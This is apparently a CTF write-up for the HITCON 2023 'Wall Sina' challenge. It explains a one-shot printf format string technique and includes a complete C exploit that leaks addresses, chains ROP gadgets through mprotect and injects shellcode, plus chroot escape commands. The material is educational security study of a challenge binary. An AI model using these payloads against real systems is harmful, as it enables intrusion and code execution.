---
title: "A New Format String Skill and Write-Up for HITCON 23: Wall Sina"
date: 2023-09-17 21:34:12
tags: 
layout: default
---

# 0x00 TL;DR

I learned some new skills about format string vulnerabilities from HITCON challenge: `Wall Sina`.

# 0x01 Prologue

I thought I knew all the format string attacking skills. However, during HITCON 2023, I encountered a simple but challenging format strings problem since I didn't know a very useful skill. I'll introduce this skill in this article and talk about some things we should take care of while exploiting a challenge in the C language.

I didn't solve the challenge in the game; this is an after-game write-up.

# 0x02 Challenge

[Attachment](https://github.com/n132/CTF-Write-Up/tree/main/2023-HITCON/wall-sina)


Enabled full mitigations (default ones), the challenge is quite simple. There are only two functions in the main function.

```c
// Pseudocode
read(0, bss_buf, 0x40);
printf(bss_buf);
```

As we know, for format string vulnerabilities, if the buffer is on the stack, we can easily achieve Arbitrary Address Write (AAW). If the buffer is in another place, such as the heap or the BSS, we usually need to use the vulnerability multiple times to exploit it. However, in some strict cases, we can only trigger the vulnerability once. Can we still exploit it without knowing any addresses?

```c
#include <stdio.h>
int main(){
    void *p = 0;
    printf("1%n", &p);
}
```

The following code shows a very basic case that we use to perform writing by printf. After executing the printf function, the value of pointer p would be 1. But if we want to modify an arbitrary address, for example, 0xdeadbeef000, we need to place the target address (0xdeadbeef000) on the stack, like this:

```c
#include<stdio.h>
#include <sys/mman.h>
int main(){
    size_t *p = mmap(0xdeadbeef000,0x1000,7,0x21,0,0);
    printf("1%n\n",p);
    printf("%d\n",*p);
}
```

So we can now see the problems of exploiting the challenge:

We don't have the address of the return address on the stack.

So we need to somehow use %n to write that address to the stack.

And then use %n again to modify the return address.

For the first step, we need to find a pattern on the stack, such as:

```
stack A: stack B -> stack C
```

This pattern means that within one current stack frame, there is a slot named `A`. Also, the data on it is a pointer on the stack that stores a stack pointer. In step 2, we're going to modify the value of C. Since pointer B is also on the stack, we can modify the data it points to in step 2. In step 2, we usually leave the address of the return address on stack B. The data should look like this:

```
stack A: stack B -> &return_addr
....
stack B: &return_addr
```

In the last step, we just modify the return address to reuse the vulnerability. In the reusing round, we have leaked addresses from previous steps and a pointer on the stack pointing to `&return_addr`. At that time, the later exploiting is very simple.

# 0x03 A New Skill for Printf

The plan is beautiful. However, we have some issues with this plan. Let's check the stack first.


```
────────[ STACK ]──────────
00:0000│ rsp 0x7fffffffdb60 ◂— 0x1000
01:0008│     0x7fffffffdb68 ◂— 0xcb6c2a8ffb3c3700
02:0010│ rbp 0x7fffffffdb70 ◂— 0x1
03:0018│     0x7fffffffdb78 —▸ 0x7ffff7daad90 (__libc_start_call_main+128) ◂— mov edi, eax
04:0020│     0x7fffffffdb80 ◂— 0x0
05:0028│     0x7fffffffdb88 —▸ 0x555555555159 ◂— push rbp
06:0030│     0x7fffffffdb90 ◂— 0x1ffffdc70
07:0038│     0x7fffffffdb98 —▸ 0x7fffffffdc88 —▸ 0x7fffffffdf14 ◂— 0x4400616e69732f2e /* './sina' */
```

As you see in the stack, there is a juicy pattern on `0x7fffffffdb98`. In this case, A=`0x7fffffffdb98`, B=`0x7fffffffdf14`. We want to modify B to `&return_addr`, which is `0x7fffffffdb78` in this case.Therefore, our payload should be like 
```
%{val}c%{idx}$hn
```

We use `%hn` to partially overwrite the last two bytes of B to change it from `0xdf14` to `0xdb78`. Also, the `val` in the payload should be the `0xdb78` and the idx is 13 since there are 5 parameters in registers after `fmtstr` and 7 before our target:
```python
val = 0xdb78
idx = 13
p.sendline(f"%{val}c%{idx}$hn".ljust(0x40,'\0').encode())
```

The stack after we overwrite the target would be like:

```
────────[ STACK ]──────────
00:0000│ rsp 0x7fffffffdb60 ◂— 0x1000
01:0008│     0x7fffffffdb68 ◂— 0xe9053e9b99676100
02:0010│ rbp 0x7fffffffdb70 ◂— 0x1
03:0018│     0x7fffffffdb78 —▸ 0x7ffff7daad90 (__libc_start_call_main+128) ◂— mov edi, eax
04:0020│     0x7fffffffdb80 ◂— 0x0
05:0028│     0x7fffffffdb88 —▸ 0x555555555159 ◂— push rbp
06:0030│     0x7fffffffdb90 ◂— 0x1ffffdc70
07:0038│     0x7fffffffdb98 —▸ 0x7fffffffdc88 —▸ 0x7fffffffdb78 —▸ 0x7ffff7daad90 (__libc_start_call_main+128) ◂— mov edi, eax
```

As you see, we successfully change the target to `&ret_address`. However, we can't change the value of the return address(step 3) at the same time.

You can try the following payload to check the data on `0x7fffffffdc88`:
```python
val = 0xdb78
idx = 13
idx2 = 43
p.send(f"%{val}c%{idx}$hn%{idx2}$p".ljust(0x40,'\0').encode())
```

The above payload would show you the original data on `0x7fffffffdc88` rather than the new address we left by `%13$n`. 


The following explanation comes from Kyle Zeng, who did read the source code of `printf`. I am too lazy to read that so I just quote his explanation and use the skill.

> That's because in the `printf` function, when encountering the first valid `$`,  the program would take a "snapshot" of current stack data and then use these data later.

That makes much sense: at the first `$` symbol, the program records the data on the stack and at that time we didn't modify the target data. Also, according to this explanation, we can somehow bypass it: if we still keep our payload in limited length(for this challenge, 0x40), we can try not to use `$` in the first place in our payload to modify the pointer before the function takes the "snapshot".

The new payload that loops the program:

```python
val = 0xdb78
payload = "%c"*11+f"%{val-11}c"
payload+= "%hn"
val = 0x163 - 0x78
payload+= f"%{val}c%43$hhn"
p.send(payload.ljust(0x40,'\0').encode())
'''
0x63 to jump to this instructure in __libc_start_call_main:
0x7ffff7daad63 <__libc_start_call_main+83>     mov    qword ptr [rsp + 0x70], rax
'''
```


# 0x04 The after-story

The part after knowing this new skill is kind of boring. We can just loop the main function and edit the data to leave some gadgets on the stack.

However, for this challenge, the hint says we'd better use C language to exploit. Even though I don't exactly understand why we should do that, I used the C language to communicate with the program and exploit it. During this process, I discovered some interesting tips we should consider when using the C language to create pipes for exploiting another program:

1. Take care of `\x00` in the returned data: For instance, if we want to perform a read operation in our exploit script, it's advisable to use functions like `memmem` rather than `strstr`. Alternatively, you can replace null bytes with other non-null values to avoid issues.
   
2. If the challenge didn't change the original stdout buffer to stream mode, we should take care of printf in child process. In the testing, if the output is larger than 0x1000 bytes(>0x1000), `printf` in the child process would split it and send them out. For example 0x1001 bytes would be 0x1000(sent) 0x1 bytes (not sent). We should fill the chunk to `x*0x1000` so the data at the end can be received.


Here are some source codes to building two pipes between the child and the parent processes. You can also use these programs to test the buffer issue of `printf`.


```c
//main.c
#include <stdio.h>
#include <sys/mman.h>

int main(){
    int fd_send[2], fd_recv[2];
    pipe(fd_send); // 3 4
    pipe(fd_recv); // 5 6
    int pid = fork();
    if(pid){
        close(fd_send[0]); // Free fd 3
        close(fd_recv[1]); // Free fd 6
        write(fd_send[1],"X",1);
        char buf[0x2000];
        memset(buf,0,0x2000);
        int res = read(fd_recv[0],buf,0x2000);
        printf("%d\n",res);
    }
    else{
        close(fd_send[1]);
        close(fd_recv[0]);
        dup2(fd_send[0],0);
        dup2(fd_recv[1],1);
        char *new_envp[]= {"Author=n132",NULL};
        execve("./target",0,new_envp);
    }
}
```



```c
//target.c
#include<stdio.h>
int main(){
    char buf[0x10];
    while(1){
        read(0,buf,0x10);
        printf("%4096c\n");
    }
}
```

# 0x05 Tips about Format String

1. `printf("%cn132%n",0,var1)` would print `\x00n132` and set `var1` to 5. We don't need to worry `\x00` generated by "%c" would stop us receiving the leaked data after it.
2. Try to use "%c" rather than other symbols while attacking since "%c" has consistent length while, for example, "%x" doesn't. Using "%c" would make the exploit more stable.
3. If it's complex for you to attack and leak in the same payload, just split it. It could be verbose but it's easy to understand and debug.

# 0x06 Escape from Chroot

If we have permission to perform `chroot` options, we can do the following to escape from a chroot jail.

```sh
mkdir n132
cd n132
chroot n132
cd ../../../.../../../../../flag
```

# 0x07 Fianl Exploit

I didn't write the IO part for it since I didn't solve the challenge during the game.
I tested the following binary by leaving it in `rootfs` and packing `rootfs` before building the docker image. Also, you need to run the following commands to prepare:

```
mkdir n132
touch n132/data
./exp
``` 

The source code of the `exp.c:


```c
#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include "shell.h"
#include <sys/select.h>
#include <unistd.h>
#define LOCAL 0


size_t target;
size_t reuse;


char *trash = 0; 
int p;
int fd_send[2];
int fd_recv[2];
int pre= 0;
int res =0;
void panic(char *s){
    puts(s);
    exit(1);
}
void init(){
    if(LOCAL){
        target = 0xed48;
        reuse = 0x63;
    }else{
        target = 0xed48;
        reuse = 0x5a;
    }
}
void loopProgram(){
    puts("[+] Sending first payload to reuse the vulnerability");
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    int x = reuse-(target&0xff);
    if(x<0)
        x+=0x100;
    snprintf(buf,0x40,"%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%%dc%%hn%%%dc%%43$hhn%%%dp|",target-0xe,x,0x10000-0xed63+9);
    do_send(buf);
    free(buf);
}
void doleak(){
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    snprintf(buf,0x40,"%%%dp%%43$hhn|%%1$p|%%3$p|%%13$p|%%%dc\n",reuse,0x2000-0x94+12);
    do_send(buf);
    free(buf);
}
void do_send(char *buf){
    printf("[+] Sent %d bytes.\n",write(fd_send[1],buf,0x40));
    //It should be okay cuz the other end would only read 0x40
}
void set_target(int idx, int off){
    int val = off + 8*idx + target+8 - reuse;
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    if(((val+reuse)>>8)==(pre>>8))
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%30$hhn\n",reuse,(val&0xff));
    else
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%30$hn\n",reuse,val);
    do_send(buf);
    // read(fd_recv[0],trash,0x10000);
    pre = val+reuse;
}
void set_val(int val,int off){
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    val = val - reuse;
    if(val<0)
        val+= 0x100;
    if(off==0)
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%45$ln\n",reuse,val);
    else
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%45$hhn\n",reuse,val);
    do_send(buf);
    // read(fd_recv[0],trash,0x10000);
}
void loadgadget(int idx,size_t val){
    int vals[6] = {0};
    vals[0] = val & 0xff;
    vals[1] = (val>>8)&0xff;
    vals[2] = (val>>16)&0xff;
    vals[3] = (val>>24)&0xff;
    vals[4] = (val>>32)&0xff;
    vals[5] = (val>>40)&0xff;
    
    for(int i =0 ; i<6;i++){
        if(vals[i]!=0){
            set_target(idx,i);
            set_val(vals[i],i);
        }else{
            if(i==0){
                set_target(idx,i);
                set_val(vals[i],i);
            }
        }
    }
}
void init_target(){
    int val =  target + 8 - reuse;
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    snprintf(buf,0x40,"%%%dx%%43$hhn%%%dx%%30$hn\n",reuse,val);
    do_send(buf);
    puts("Test if we can init the target");
    read(fd_recv[0],trash,0x2000);
    pre = val+reuse;
}
int do_recv(int fd, char * ptr,size_t size,size_t exepct_ct){
    char *buf = malloc(0x2000) ;
    int i = 0 ; 
    memset(ptr,0,size);
    for(int ct = 0 ; ct<exepct_ct ;ct++){
        memset(buf,0,0x2000);
        int tmp = read(fd,buf,0x2000);
        usleep(100000);
        if(tmp<=0)
            panic("de_recv");
        else
            memcpy(ptr+i,buf,tmp);
        i+=tmp;
        if(tmp<0x2000)
            break;
    }
    if(i >= size)
        puts("[!] The buffer is full, you may need a larger buffer.");
    printf("[+] Read %p byets\n", i);
    return i;
}
int burte_force(){
    pipe(fd_send); // 3 4
    pipe(fd_recv); // 5 6
    int pid = fork();
    if(pid){
        close(fd_send[0]); // Free fd 3
        close(fd_recv[1]); // Free fd 6
        // Maintaining 
        char *buf= malloc(0x40000);
        trash = malloc(0x40000);
        read(0,buf,0x10); // Pause to wait for the debugger
        loopProgram();    // Send the first payload to leak the address and loop the program
        puts("[+] Loop the program");
        read(0,trash,2);
        res = do_recv(fd_recv[0],buf,0x40000,8);
        puts("[+] Retrive the leaked data...");
        doleak();
        res = read(fd_recv[0],buf,0x2000);
        printf("%d\n",res);
        for(int i = 0; i<res;i++)
            if(buf[i]==0)
                buf[i]=0x61;
        puts("\n=============================================");
        for(int i = 0; i<res;i++)
            if(buf[i]==0)
                buf[i]=0x61;
        char *ptr1 = strstr(buf,"|");
        ptr1[0] = 0 ;
        char *ptr2 = strstr(ptr1+1,"|");
        ptr2[0] = 0 ;
        char *ptr3 = strstr(ptr2+1,"|");
        ptr3[0] = 0 ;
        char *ptr4 = strstr(ptr3+1,"|");
        ptr4[0] = 0 ;
        char *ptr5 = strstr(ptr4+1,"|");
        ptr5[0] = 0 ;
        size_t leaked_pie       = strtoll(ptr2+1, NULL, 16);
        size_t leaked_libc      = strtoll(ptr3+1, NULL, 16);
        size_t leaked_stack     = strtoll(ptr4+1, NULL, 16);
        printf("[Leaked Stack] \t\t%p\n",leaked_stack);
        printf("[Leaked Libc] \t\t%p\n",leaked_libc);
        printf("[Leaked pie] \t\t%p\n",leaked_pie);
        puts("\n=============================================");
        
        // remove \x00 in the leaked data so we can use strstr to locate the target

        puts("[+] Init the target");
        init_target();
        
        size_t base,rdi,rsi,rdx,mprotect,gets,rbp,leave,read_addr;
        if(LOCAL){
            base = leaked_libc-(0x7ffff7e96992-0x00007ffff7d82000);
            rdi  = 0x000000000002a3e5+base;
            rsi  = 0x000000000002be51+base;
            rdx  = 0x000000000011f497+base; // pop rdx pop r12
            leave = 0x00000000000562ec+base;
            mprotect = 0x7ffff7ea0c50+base-0x00007ffff7d82000;
            gets = 0x7ffff7e025a0+base-0x00007ffff7d82000;
            rbp = 0x000000000002a2e0+base;
            read_addr = 0x7ffff7e96980-0x7ffff7d82000+base;
        }
        else{            
            base = leaked_libc-(0x7ffff7eb6a22-0x00007ffff7db9000);
            rdi  = 0x000000000002dad2+base;
            rsi  = 0x000000000002f2c1+base;
            rdx  = 0x00000000001073d7+base; // pop rdx pop r12
            rbp  = 0x000000000002da00+base;
            leave = 0x0000000000052f2f+base;
            mprotect = 1076112+base;
            gets = 497392+base;
            read_addr = 1038864+base;
            
        }
        int ct = 0x22;
        loadgadget(0,gets+6);
        char *final = malloc(0x40);
        memset(final,0,0x40);
        snprintf(final,0x40,"%%%dc%%43$hhn\n",0x4);
        do_send(final);
        
        char* x = malloc(0x1000);
        size_t *ptr = x;

        if(LOCAL)
            ct = 0x4f0;
        else
            ct = 0x4c0; 
        ct = ct/8;

        ptr[ct++] = rdi;
        ptr[ct++] = 0;
        ptr[ct++] = rsi;
        ptr[ct++] = (leaked_stack>>12<<12)+0x800-0x1000;
        ptr[ct++] = rdx;
        ptr[ct++] = 0x800;
        ptr[ct++] = 0;
        ptr[ct++] = read_addr;
        ptr[ct++] = rbp;
        ptr[ct++] = (leaked_stack>>12<<12)+0x800-8-0x1000;
        ptr[ct++] = leave;
        x[ct*8] = '\n';
        write(fd_send[1],x,ct*8+1);
            
        char *yyy = malloc(0x1000);
        ptr = yyy;
        ct = 0;
        ptr[ct++] = rdi;
        ptr[ct++] = (leaked_stack>>12<<12)-0x1000;
        ptr[ct++] = rsi;
        ptr[ct++] = 0x1000;
        ptr[ct++] = rdx;
        ptr[ct++] = 7;
        ptr[ct++] = 0;
        ptr[ct++] = mprotect;
        ptr[ct++] = (leaked_stack>>12<<12)+(ct*8+8)-0x800;
        char *xxxz = yyy+ct*8;
        while(ct<0x100)
            ptr[ct++] =rdi+1; 
        memcpy(xxxz,shellphish,sizeof(shellphish));

        read(0,trash,0x10);
        write(fd_send[1],yyy,0x800);
        sleep(3);
    }
    else{
        close(fd_send[1]);
        close(fd_recv[0]);
        dup2(fd_send[0],0);
        dup2(fd_recv[1],1);
        setvbuf(stdin,0,2,0);
        setvbuf(stderr,0,2,0);
        setvbuf(stdout,0,2,0);
        if(LOCAL==1){
            char *new_envp[] = { "xxxxx=xxx", NULL };
            execve("./sina",0,new_envp);
        }
        else{
            // char *new_envp[] = { "LD_PRELOAD=./libc.so.6", NULL };
            char *new_envp[]= {"n132=n132",NULL};
            execve("./sina",0,new_envp);
        }
    }
}
int main() {
    puts("init");
    init();
    burte_force();
}
```

# 0x08 Epilogue
- Thank Kyle for this skill, it skill is very useful
- We can loop a format string vulnerability at most cases
- A practice of writing C-pwntools 
- Review the traditional "chroot escape"
- Learn more about `setcap/getcap`